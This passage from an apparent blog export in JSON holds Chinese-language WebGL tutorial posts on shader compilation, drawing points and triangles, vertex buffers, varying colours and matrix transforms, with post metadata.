e.pageX\ne.clientY + document.documentElement.scrollTop -\ndocument.documentElement.clientTop = e.pageY\n\n滚动高度\n为了跨浏览器兼容，请使用 window.pageYOffset 代替 window.scrollY;\nIE（<9）两个属性都不支持;\nsafari不支持document.documentElement.scrollTop;\n下面的兼容写法\n\nlet scrollTop = document.documentElement.scrollTop || window.pageYOffset ||\ndocument.body.scrollTop;","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-05-16T10:45:12.000Z","created_by":"1","updated_at":"2018-05-16T11:02:10.000Z","updated_by":"1","published_at":"2018-05-16T10:58:35.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d353","uuid":"df2175f7-8a72-4c79-9f46-6a640c75362e","title":"webgl学习1——画一点","slug":"webglxue-xi-1","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> shader编译\\n```\\nexport function loadShader(gl: WebGLRenderingContext, type: number, source: string) {\\n    const shader = gl.createShader(type);\\n    gl.shaderSource(shader, source);\\n    gl.compileShader(shader);\\n    const compiled = gl.getShaderParameter(shader, gl.COMPILE_STATUS);\\n    if (!compiled) {\\n        console.log(gl.getShaderInfoLog(shader));\\n        return false;\\n    }\\n    return shader;\\n}\\n```\\n> 连接pragrom\\n```\\nexport function createProgram(gl: WebGLRenderingContext, vshader: string, fshader: string) {\\n    const vertexShader = loadShader(gl, gl.VERTEX_SHADER, vshader);\\n    const fragmentShader = loadShader(gl, gl.FRAGMENT_SHADER, fshader);\\n    const program = gl.createProgram();\\n    gl.attachShader(program, vertexShader);\\n    gl.attachShader(program, fragmentShader);\\n    gl.linkProgram(program);\\n    const linked = gl.getProgramParameter(program, gl.LINK_STATUS);\\n    if (!linked) {\\n       //获取连接状态\\n        console.log(gl.getProgramInfoLog(program));\\n        return false;\\n    }\\n    gl.useProgram(program)\\n    return program;\\n}\\n```\\n> 清楚画布\\n```\\n        gl.clearColor(0.0, 0.0, 0.0, 1.0); 设置清除颜色\\n        gl.clear(this.gl.COLOR_BUFFER_BIT);\\n```\\n###### 程序\\n```\\n//顶点着色器\\nvoid main(void){  \\n    gl_Position = vec4(0.0,0.5,0.0,1.0);\\n    gl_PointSize = 10.0;\\n} \\n直接在shader中，赋值坐标，直接画出点\\ngl.drawArrays(gl.POINTS, 0, 1);\\n```\\n\\n[demo](http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo0/deploy/index.html)\\n[github](https://github.com/laopo001/webgl-learn/tree/master/src/demo)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>shader编译</p>\n</blockquote>\n<pre><code>export function loadShader(gl: WebGLRenderingContext, type: number, source: string) {\n    const shader = gl.createShader(type);\n    gl.shaderSource(shader, source);\n    gl.compileShader(shader);\n    const compiled = gl.getShaderParameter(shader, gl.COMPILE_STATUS);\n    if (!compiled) {\n        console.log(gl.getShaderInfoLog(shader));\n        return false;\n    }\n    return shader;\n}\n</code></pre>\n<blockquote>\n<p>连接pragrom</p>\n</blockquote>\n<pre><code>export function createProgram(gl: WebGLRenderingContext, vshader: string, fshader: string) {\n    const vertexShader = loadShader(gl, gl.VERTEX_SHADER, vshader);\n    const fragmentShader = loadShader(gl, gl.FRAGMENT_SHADER, fshader);\n    const program = gl.createProgram();\n    gl.attachShader(program, vertexShader);\n    gl.attachShader(program, fragmentShader);\n    gl.linkProgram(program);\n    const linked = gl.getProgramParameter(program, gl.LINK_STATUS);\n    if (!linked) {\n       //获取连接状态\n        console.log(gl.getProgramInfoLog(program));\n        return false;\n    }\n    gl.useProgram(program)\n    return program;\n}\n</code></pre>\n<blockquote>\n<p>清楚画布</p>\n</blockquote>\n<pre><code>        gl.clearColor(0.0, 0.0, 0.0, 1.0); 设置清除颜色\n        gl.clear(this.gl.COLOR_BUFFER_BIT);\n</code></pre>\n<h6 id=\"\">程序</h6>\n<pre><code>//顶点着色器\nvoid main(void){  \n    gl_Position = vec4(0.0,0.5,0.0,1.0);\n    gl_PointSize = 10.0;\n} \n直接在shader中，赋值坐标，直接画出点\ngl.drawArrays(gl.POINTS, 0, 1);\n</code></pre>\n<p><a href=\"http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo0/deploy/index.html\">demo</a><br>\n<a href=\"https://github.com/laopo001/webgl-learn/tree/master/src/demo\">github</a></p>\n<!--kg-card-end: markdown-->","comment_id":"151","plaintext":"> shader编译\n\n\nexport function loadShader(gl: WebGLRenderingContext, type: number, source: string) {\n    const shader = gl.createShader(type);\n    gl.shaderSource(shader, source);\n    gl.compileShader(shader);\n    const compiled = gl.getShaderParameter(shader, gl.COMPILE_STATUS);\n    if (!compiled) {\n        console.log(gl.getShaderInfoLog(shader));\n        return false;\n    }\n    return shader;\n}\n\n\n> 连接pragrom\n\n\nexport function createProgram(gl: WebGLRenderingContext, vshader: string, fshader: string) {\n    const vertexShader = loadShader(gl, gl.VERTEX_SHADER, vshader);\n    const fragmentShader = loadShader(gl, gl.FRAGMENT_SHADER, fshader);\n    const program = gl.createProgram();\n    gl.attachShader(program, vertexShader);\n    gl.attachShader(program, fragmentShader);\n    gl.linkProgram(program);\n    const linked = gl.getProgramParameter(program, gl.LINK_STATUS);\n    if (!linked) {\n       //获取连接状态\n        console.log(gl.getProgramInfoLog(program));\n        return false;\n    }\n    gl.useProgram(program)\n    return program;\n}\n\n\n> 清楚画布\n\n\n        gl.clearColor(0.0, 0.0, 0.0, 1.0); 设置清除颜色\n        gl.clear(this.gl.COLOR_BUFFER_BIT);\n\n\n程序\n//顶点着色器\nvoid main(void){  \n    gl_Position = vec4(0.0,0.5,0.0,1.0);\n    gl_PointSize = 10.0;\n} \n直接在shader中，赋值坐标，直接画出点\ngl.drawArrays(gl.POINTS, 0, 1);\n\n\ndemo\n[http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo0/deploy/index.html]\ngithub [https://github.com/laopo001/webgl-learn/tree/master/src/demo]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-05-17T12:25:22.000Z","created_by":"1","updated_at":"2018-05-21T11:05:14.000Z","updated_by":"1","published_at":"2018-05-17T12:32:15.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d354","uuid":"901df49e-b7a6-4add-be6d-91487ae29a0c","title":"webgl学习2——鼠标画点","slug":"webglxue-xi-2-shu-biao-hua-dian","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"与上篇博客不同的是，这次试用了attribute变量，向shader中传参数。\\n\\n```\\n        let vertices = [0.0, 0.0];\\n\\n        let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');\\n        let program = initShaders(gl, vert, frag);\\n        const a_Position = gl.getAttribLocation(program, 'position');\\n        canvas.addEventListener('click', (e) => {\\n            let rect = canvas.getBoundingClientRect();\\n            let x = e.clientX / rect.width * 2 - 1;\\n            let y = 1 - e.clientY / rect.height * 2;\\n            vertices.push(x, y)\\n            console.log(x, y);\\n            gl.clear(gl.COLOR_BUFFER_BIT);\\n            for (let i = 0; i < vertices.length; i = i + 2) {\\n                let x = vertices[i];\\n                let y = vertices[i + 1];\\n                gl.vertexAttrib3f(a_Position, x, y, 0)\\n                gl.drawArrays(gl.POINTS, 0, 1);\\n            }\\n        })\\n        gl.vertexAttrib3f(a_Position, vertices[0], vertices[1], 0.0)\\n        gl.clearColor(0.0, 0.0, 0.0, 1.0);\\n        gl.clear(gl.COLOR_BUFFER_BIT);\\n        gl.drawArrays(gl.POINTS, 0, 1);\\n\\n```\\n> getAttribLocation\\n\\ngetAttribLocation(program: WebGLProgram | null, name: string): number;\\n\\n返回属性位置的下标 GLint 数字，如果找不到该属性则返回-1。\\n\\n\\n> `WebGLRenderingContext.vertexAttrib[1234]f[v]()`\\n\\n可以为顶点attibute变量赋值。\\n\\nvoid gl.vertexAttrib1f(index, v0);\\nvoid gl.vertexAttrib2f(index, v0, v1);\\nvoid gl.vertexAttrib3f(index, v0, v1, v2);\\nvoid gl.vertexAttrib4f(index, v0, v1, v2, v3);\\n\\nvoid gl.vertexAttrib1fv(index, value);\\nvoid gl.vertexAttrib2fv(index, value);\\nvoid gl.vertexAttrib3fv(index, value);\\nvoid gl.vertexAttrib4fv(index, value);\\n\\n```\\nconst a_foobar = gl.getAttribLocation(shaderProgram, 'foobar');\\n//either set each component individually:\\ngl.vertexAttrib3f(a_foobar, 10.0, 5.0, 2.0);\\n//or provide a Float32Array:\\nconst floatArray = new Float32Array([10.0, 5.0, 2.0]);\\ngl.vertexAttrib3fv(a_foobar, floatArray);\\n```\\n\\n前3个参数默认补0，最后一位补1.\\n\\n[demo](http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo1/deploy/index.html)\\n[github](https://github.com/laopo001/webgl-learn/tree/master/src/demo1)\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>与上篇博客不同的是，这次试用了attribute变量，向shader中传参数。</p>\n<pre><code>        let vertices = [0.0, 0.0];\n\n        let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');\n        let program = initShaders(gl, vert, frag);\n        const a_Position = gl.getAttribLocation(program, 'position');\n        canvas.addEventListener('click', (e) =&gt; {\n            let rect = canvas.getBoundingClientRect();\n            let x = e.clientX / rect.width * 2 - 1;\n            let y = 1 - e.clientY / rect.height * 2;\n            vertices.push(x, y)\n            console.log(x, y);\n            gl.clear(gl.COLOR_BUFFER_BIT);\n            for (let i = 0; i &lt; vertices.length; i = i + 2) {\n                let x = vertices[i];\n                let y = vertices[i + 1];\n                gl.vertexAttrib3f(a_Position, x, y, 0)\n                gl.drawArrays(gl.POINTS, 0, 1);\n            }\n        })\n        gl.vertexAttrib3f(a_Position, vertices[0], vertices[1], 0.0)\n        gl.clearColor(0.0, 0.0, 0.0, 1.0);\n        gl.clear(gl.COLOR_BUFFER_BIT);\n        gl.drawArrays(gl.POINTS, 0, 1);\n\n</code></pre>\n<blockquote>\n<p>getAttribLocation</p>\n</blockquote>\n<p>getAttribLocation(program: WebGLProgram | null, name: string): number;</p>\n<p>返回属性位置的下标 GLint 数字，如果找不到该属性则返回-1。</p>\n<blockquote>\n<p><code>WebGLRenderingContext.vertexAttrib[1234]f[v]()</code></p>\n</blockquote>\n<p>可以为顶点attibute变量赋值。</p>\n<p>void gl.vertexAttrib1f(index, v0);<br>\nvoid gl.vertexAttrib2f(index, v0, v1);<br>\nvoid gl.vertexAttrib3f(index, v0, v1, v2);<br>\nvoid gl.vertexAttrib4f(index, v0, v1, v2, v3);</p>\n<p>void gl.vertexAttrib1fv(index, value);<br>\nvoid gl.vertexAttrib2fv(index, value);<br>\nvoid gl.vertexAttrib3fv(index, value);<br>\nvoid gl.vertexAttrib4fv(index, value);</p>\n<pre><code>const a_foobar = gl.getAttribLocation(shaderProgram, 'foobar');\n//either set each component individually:\ngl.vertexAttrib3f(a_foobar, 10.0, 5.0, 2.0);\n//or provide a Float32Array:\nconst floatArray = new Float32Array([10.0, 5.0, 2.0]);\ngl.vertexAttrib3fv(a_foobar, floatArray);\n</code></pre>\n<p>前3个参数默认补0，最后一位补1.</p>\n<p><a href=\"http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo1/deploy/index.html\">demo</a><br>\n<a href=\"https://github.com/laopo001/webgl-learn/tree/master/src/demo1\">github</a></p>\n<!--kg-card-end: markdown-->","comment_id":"152","plaintext":"与上篇博客不同的是，这次试用了attribute变量，向shader中传参数。\n\n        let vertices = [0.0, 0.0];\n\n        let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');\n        let program = initShaders(gl, vert, frag);\n        const a_Position = gl.getAttribLocation(program, 'position');\n        canvas.addEventListener('click', (e) => {\n            let rect = canvas.getBoundingClientRect();\n            let x = e.clientX / rect.width * 2 - 1;\n            let y = 1 - e.clientY / rect.height * 2;\n            vertices.push(x, y)\n            console.log(x, y);\n            gl.clear(gl.COLOR_BUFFER_BIT);\n            for (let i = 0; i < vertices.length; i = i + 2) {\n                let x = vertices[i];\n                let y = vertices[i + 1];\n                gl.vertexAttrib3f(a_Position, x, y, 0)\n                gl.drawArrays(gl.POINTS, 0, 1);\n            }\n        })\n        gl.vertexAttrib3f(a_Position, vertices[0], vertices[1], 0.0)\n        gl.clearColor(0.0, 0.0, 0.0, 1.0);\n        gl.clear(gl.COLOR_BUFFER_BIT);\n        gl.drawArrays(gl.POINTS, 0, 1);\n\n\n\n> getAttribLocation\n\n\ngetAttribLocation(program: WebGLProgram | null, name: string): number;\n\n返回属性位置的下标 GLint 数字，如果找不到该属性则返回-1。\n\n> WebGLRenderingContext.vertexAttrib[1234]f[v]()\n\n\n可以为顶点attibute变量赋值。\n\nvoid gl.vertexAttrib1f(index, v0);\nvoid gl.vertexAttrib2f(index, v0, v1);\nvoid gl.vertexAttrib3f(index, v0, v1, v2);\nvoid gl.vertexAttrib4f(index, v0, v1, v2, v3);\n\nvoid gl.vertexAttrib1fv(index, value);\nvoid gl.vertexAttrib2fv(index, value);\nvoid gl.vertexAttrib3fv(index, value);\nvoid gl.vertexAttrib4fv(index, value);\n\nconst a_foobar = gl.getAttribLocation(shaderProgram, 'foobar');\n//either set each component individually:\ngl.vertexAttrib3f(a_foobar, 10.0, 5.0, 2.0);\n//or provide a Float32Array:\nconst floatArray = new Float32Array([10.0, 5.0, 2.0]);\ngl.vertexAttrib3fv(a_foobar, floatArray);\n\n\n前3个参数默认补0，最后一位补1.\n\ndemo\n[http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo1/deploy/index.html]\ngithub [https://github.com/laopo001/webgl-learn/tree/master/src/demo1]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-05-17T12:32:42.000Z","created_by":"1","updated_at":"2018-05-21T11:05:43.000Z","updated_by":"1","published_at":"2018-05-17T12:32:44.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d355","uuid":"a7ff08a8-f23d-4d9b-841a-e16c9e403d64","title":"webgl学习3——画一个三角形","slug":"webglxue-xi-xuan-zhuan-suo-fang-ping-yi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 准备顶点的坐标\\n\\nlet vertices = new Float32Array([-0.5, -0.5, 0.0, 0.5, -0.5, 0.0, 0.0, 0.5, 0.0])\\n\\n> 创建顶点缓存VBO\\n\\n```\\n    createVbo(data: Float32Array): WebGLBuffer {\\n        let { gl } = this;\\n        // 创建缓存区对象\\n        let vbo = gl.createBuffer();\\n        // 将缓冲区对象绑定到目标\\n        gl.bindBuffer(gl.ARRAY_BUFFER, vbo);\\n        // 想向缓冲区对象中写入数据\\n        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);\\n        return vbo;\\n    }\\n```\\n\\n> 将顶点缓存传入顶点attibute变量\\n\\n```\\n        const a_Position = gl.getAttribLocation(program, 'position');\\n        gl.vertexAttribPointer(a_Position, 3, gl.FLOAT, false, 0, 0);\\n        gl.enableVertexAttribArray(a_Position);\\n```\\n\\n> [vertexAttribPointer](https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/vertexAttribPointer)\\n\\ngl.vertexAttribPointer(index, size, type, normalized, stride, offset)\\n```\\nindex 指定要修改的顶点属性的索引。\\nsize 指定每个顶点属性的数量。\\ntype 数据类型.\\n   gl.BYTE: signed 8-bit integer, with values in [-128, 127]\\n   gl.SHORT: signed 16-bit integer, with values in [-32768, 32767]\\n   gl.UNSIGNED_BYTE: unsigned 8-bit integer, with values in [0, 255]\\n   gl.UNSIGNED_SHORT: unsigned 16-bit integer, with values in [0, 65535]\\n   gl.FLOAT: 32-bit IEEE floating point number\\n   When using a WebGL 2 context, the following values are available additionally:\\n      gl.HALF_FLOAT: 16-bit IEEE floating point number\\nnormalized 指定整数数据值在被转换为浮点数时是否应归一化到一定范围内。\\n   对于类型gl.BYTE和gl.SHORT，如果为true，则将值标准化为[-1,1]。\\n   对于gl.UNSIGNED_BYTE和gl.UNSIGNED_SHORT类型，如果值为true，则将值标准化为[0，1]。\\n   对于gl.FLOAT和gl.HALF_FLOAT类型，此参数不起作用。\\nstride 指定连续顶点属性开始之间的偏移量（以字节为单位）。不能大于255.如果步幅为0，则假定属性紧密排列。\\noffset 指定顶点属性数组中第一个组件的字节偏移量。必须是类型的倍数。\\n```\\n\\n> enableVertexAttribArray\\n\\ngl.enableVertexAttribArray(index);\\n开启指定索引的顶点属性\\n\\n> drawArrays\\n\\nvoid gl.drawArrays(mode, first, count);\\n\\n![](/content/images/2018/05/1.png)\\n![](/content/images/2018/05/2.png)\\n\\n> demo\\n\\n[demo](http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo2/deploy/index.html)\\n[github](https://github.com/laopo001/webgl-learn/tree/master/src/demo2)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>准备顶点的坐标</p>\n</blockquote>\n<p>let vertices = new Float32Array([-0.5, -0.5, 0.0, 0.5, -0.5, 0.0, 0.0, 0.5, 0.0])</p>\n<blockquote>\n<p>创建顶点缓存VBO</p>\n</blockquote>\n<pre><code>    createVbo(data: Float32Array): WebGLBuffer {\n        let { gl } = this;\n        // 创建缓存区对象\n        let vbo = gl.createBuffer();\n        // 将缓冲区对象绑定到目标\n        gl.bindBuffer(gl.ARRAY_BUFFER, vbo);\n        // 想向缓冲区对象中写入数据\n        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);\n        return vbo;\n    }\n</code></pre>\n<blockquote>\n<p>将顶点缓存传入顶点attibute变量</p>\n</blockquote>\n<pre><code>        const a_Position = gl.getAttribLocation(program, 'position');\n        gl.vertexAttribPointer(a_Position, 3, gl.FLOAT, false, 0, 0);\n        gl.enableVertexAttribArray(a_Position);\n</code></pre>\n<blockquote>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/vertexAttribPointer\">vertexAttribPointer</a></p>\n</blockquote>\n<p>gl.vertexAttribPointer(index, size, type, normalized, stride, offset)</p>\n<pre><code>index 指定要修改的顶点属性的索引。\nsize 指定每个顶点属性的数量。\ntype 数据类型.\n   gl.BYTE: signed 8-bit integer, with values in [-128, 127]\n   gl.SHORT: signed 16-bit integer, with values in [-32768, 32767]\n   gl.UNSIGNED_BYTE: unsigned 8-bit integer, with values in [0, 255]\n   gl.UNSIGNED_SHORT: unsigned 16-bit integer, with values in [0, 65535]\n   gl.FLOAT: 32-bit IEEE floating point number\n   When using a WebGL 2 context, the following values are available additionally:\n      gl.HALF_FLOAT: 16-bit IEEE floating point number\nnormalized 指定整数数据值在被转换为浮点数时是否应归一化到一定范围内。\n   对于类型gl.BYTE和gl.SHORT，如果为true，则将值标准化为[-1,1]。\n   对于gl.UNSIGNED_BYTE和gl.UNSIGNED_SHORT类型，如果值为true，则将值标准化为[0，1]。\n   对于gl.FLOAT和gl.HALF_FLOAT类型，此参数不起作用。\nstride 指定连续顶点属性开始之间的偏移量（以字节为单位）。不能大于255.如果步幅为0，则假定属性紧密排列。\noffset 指定顶点属性数组中第一个组件的字节偏移量。必须是类型的倍数。\n</code></pre>\n<blockquote>\n<p>enableVertexAttribArray</p>\n</blockquote>\n<p>gl.enableVertexAttribArray(index);<br>\n开启指定索引的顶点属性</p>\n<blockquote>\n<p>drawArrays</p>\n</blockquote>\n<p>void gl.drawArrays(mode, first, count);</p>\n<p><img src=\"/content/images/2018/05/1.png\" alt=\"\"><br>\n<img src=\"/content/images/2018/05/2.png\" alt=\"\"></p>\n<blockquote>\n<p>demo</p>\n</blockquote>\n<p><a href=\"http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo2/deploy/index.html\">demo</a><br>\n<a href=\"https://github.com/laopo001/webgl-learn/tree/master/src/demo2\">github</a></p>\n<!--kg-card-end: markdown-->","comment_id":"153","plaintext":"> 准备顶点的坐标\n\n\nlet vertices = new Float32Array([-0.5, -0.5, 0.0, 0.5, -0.5, 0.0, 0.0, 0.5,\n0.0])\n\n> 创建顶点缓存VBO\n\n\n    createVbo(data: Float32Array): WebGLBuffer {\n        let { gl } = this;\n        // 创建缓存区对象\n        let vbo = gl.createBuffer();\n        // 将缓冲区对象绑定到目标\n        gl.bindBuffer(gl.ARRAY_BUFFER, vbo);\n        // 想向缓冲区对象中写入数据\n        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);\n        return vbo;\n    }\n\n\n> 将顶点缓存传入顶点attibute变量\n\n\n        const a_Position = gl.getAttribLocation(program, 'position');\n        gl.vertexAttribPointer(a_Position, 3, gl.FLOAT, false, 0, 0);\n        gl.enableVertexAttribArray(a_Position);\n\n\n> vertexAttribPointer\n[https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/vertexAttribPointer]\n\n\ngl.vertexAttribPointer(index, size, type, normalized, stride, offset)\n\nindex 指定要修改的顶点属性的索引。\nsize 指定每个顶点属性的数量。\ntype 数据类型.\n   gl.BYTE: signed 8-bit integer, with values in [-128, 127]\n   gl.SHORT: signed 16-bit integer, with values in [-32768, 32767]\n   gl.UNSIGNED_BYTE: unsigned 8-bit integer, with values in [0, 255]\n   gl.UNSIGNED_SHORT: unsigned 16-bit integer, with values in [0, 65535]\n   gl.FLOAT: 32-bit IEEE floating point number\n   When using a WebGL 2 context, the following values are available additionally:\n      gl.HALF_FLOAT: 16-bit IEEE floating point number\nnormalized 指定整数数据值在被转换为浮点数时是否应归一化到一定范围内。\n   对于类型gl.BYTE和gl.SHORT，如果为true，则将值标准化为[-1,1]。\n   对于gl.UNSIGNED_BYTE和gl.UNSIGNED_SHORT类型，如果值为true，则将值标准化为[0，1]。\n   对于gl.FLOAT和gl.HALF_FLOAT类型，此参数不起作用。\nstride 指定连续顶点属性开始之间的偏移量（以字节为单位）。不能大于255.如果步幅为0，则假定属性紧密排列。\noffset 指定顶点属性数组中第一个组件的字节偏移量。必须是类型的倍数。\n\n\n> enableVertexAttribArray\n\n\ngl.enableVertexAttribArray(index);\n开启指定索引的顶点属性\n\n> drawArrays\n\n\nvoid gl.drawArrays(mode, first, count);\n\n\n\n\n> demo\n\n\ndemo\n[http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo2/deploy/index.html]\ngithub [https://github.com/laopo001/webgl-learn/tree/master/src/demo2]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-05-20T04:01:42.000Z","created_by":"1","updated_at":"2018-05-21T11:07:17.000Z","updated_by":"1","published_at":"2018-05-20T05:25:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d356","uuid":"3c5b6c19-63cf-49a0-9e0c-2ac8735a1370","title":"webgl学习5——有颜色的三角形","slug":"webglxue-xi-4-you-yan-se-de-san-jiao-xing-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\n// vertex shader\\nattribute vec4 position;  \\nuniform mat4 matrix;\\nattribute vec4 a_Color;\\nvarying vec4 v_Color;\\nvoid main(){  \\n    gl_Position = matrix * position;\\n    v_Color = a_Color;\\n}\\n// fragment shader\\nprecision lowp float;\\nvarying vec4 v_Color;                \\nvoid main(void) {                          \\n    gl_FragColor = v_Color;                \\n}\\n```\\n> varying变量\\n\\n向片元着色器传递数据（片元着色器不支持attribute变量），先声明attribute变量a_Color用以接受颜色数据，然后声明了新的varying变量v_Color，该变量负责将颜色值传给片元着色器。varying变量只能是float(以及像个的vec2 vec3 vec4 mat3 mat4)类型。\\n\\n\\n> demo\\n\\n[demo](http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo4/deploy/index.html)\\n[github](https://github.com/laopo001/webgl-learn/tree/master/src/demo4)\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>// vertex shader\nattribute vec4 position;  \nuniform mat4 matrix;\nattribute vec4 a_Color;\nvarying vec4 v_Color;\nvoid main(){  \n    gl_Position = matrix * position;\n    v_Color = a_Color;\n}\n// fragment shader\nprecision lowp float;\nvarying vec4 v_Color;                \nvoid main(void) {                          \n    gl_FragColor = v_Color;                \n}\n</code></pre>\n<blockquote>\n<p>varying变量</p>\n</blockquote>\n<p>向片元着色器传递数据（片元着色器不支持attribute变量），先声明attribute变量a_Color用以接受颜色数据，然后声明了新的varying变量v_Color，该变量负责将颜色值传给片元着色器。varying变量只能是float(以及像个的vec2 vec3 vec4 mat3 mat4)类型。</p>\n<blockquote>\n<p>demo</p>\n</blockquote>\n<p><a href=\"http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo4/deploy/index.html\">demo</a><br>\n<a href=\"https://github.com/laopo001/webgl-learn/tree/master/src/demo4\">github</a></p>\n<!--kg-card-end: markdown-->","comment_id":"154","plaintext":"// vertex shader\nattribute vec4 position;  \nuniform mat4 matrix;\nattribute vec4 a_Color;\nvarying vec4 v_Color;\nvoid main(){  \n    gl_Position = matrix * position;\n    v_Color = a_Color;\n}\n// fragment shader\nprecision lowp float;\nvarying vec4 v_Color;                \nvoid main(void) {                          \n    gl_FragColor = v_Color;                \n}\n\n\n> varying变量\n\n\n向片元着色器传递数据（片元着色器不支持attribute变量），先声明attribute变量a_Color用以接受颜色数据，然后声明了新的varying变量v_Color，该变量负责将颜色值传给片元着色器。varying变量只能是float(以及像个的vec2\nvec3 vec4 mat3 mat4)类型。\n\n> demo\n\n\ndemo\n[http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo4/deploy/index.html]\ngithub [https://github.com/laopo001/webgl-learn/tree/master/src/demo4]","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2018-05-20T05:47:53.000Z","created_by":"1","updated_at":"2018-05-21T16:03:47.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d357","uuid":"02385692-c931-465b-ac31-85a4ccf10e01","title":"webgl学习4——画一个三角形并旋转缩放平移","slug":"webglxue-xi-4-hua-yi-ge-san-jiao-xing-bing-xuan-zhuan-suo-fang-ping-yi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nshader如下\\nattribute vec4 position;  \\nuniform mat4 matrix;\\nvoid main(void){  \\n    gl_Position = matrix * position;\\n    gl_PointSize = 10.0;\\n}  \\n\\nvoid main(void){  \\n    gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);  \\n}  \\n```\\n\\n这里通过matrix 一个4*4矩阵来变换。通过uniform变量来传递。\\n\\n> uniform 变量\\n\\n我们已经知道了如何从js中向顶点着色器的attribute变量传递数据，这里有个新的变量uniform，它用来从js中向顶点or片元着色器传输`一致的（不变的）`数据。如下使用\\n\\n\\n```\\n        // 以z轴为中心，旋转90度\\n        let mat4Angles = new Mat4().setFromEulerAngles(0, 0, 90);\\n        // x,y缩放1.5倍\\n        let mat4Scale = new Mat4().setScale(1.5, 1.5, 1);\\n        // x,y位移0.2\\n        let mat4Translate = new Mat4().setTranslate(0.2, 0.2, 0.2);\\n        // 矩阵相乘\\n        let mat4 = mat4Angles.mul(mat4Scale).mul(mat4Translate);\\n        //获取uniform变量的下标\\n        const matrix = gl.getUniformLocation(program, 'matrix');\\n        // 赋值\\n        gl.uniformMatrix4fv(matrix, false, mat4.data)\\n\\n```\\n\\n> demo\\n\\n[demo](http://dadigua.oss-cn-shenzhen.aliyuncs.com/webgl-learn/demo3/deploy/index.html)\\n[github](https://github.com/laopo001/webgl-learn/tree/master/src/demo3)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>shader如下\nattribute vec4 position;  \nuniform mat4 matrix;\nvoid main(void){  \n    gl_Position = matrix * position;\n    gl_PointSize = 10.0;\n}  \n\nvoid main(void){  \n    gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);  \n}  \n</code></pre>\n<p>这里通过matrix 一个4*4矩阵来变换。通过uniform变量来传递。</p>\n<blockquote>\n<p>uniform 变量</p>\n</blockquote>\n<p>我们已经知道了如何从js中向顶点着色器的attribute变量传递数据，这里有个新的变量uniform，它用来从js中向顶点or片元着色器传输<code>一致的（不变的）</code>数据。如下使用</p>\n<pre><code>        // 以z轴为中心，旋转90度\n        let mat4Angles = new Mat4().setFromEulerAngles(0, 0, 90);\n        // x,y缩放1.5倍\n        let mat4Scale = new Mat4().setScale(1.5, 1.5, 1);\n        // x,y位移0.2\n        let mat4Translate = new Mat4().setTranslate(0.2, 0.2, 0.2);\n        // 矩阵相乘\n        let mat4 = 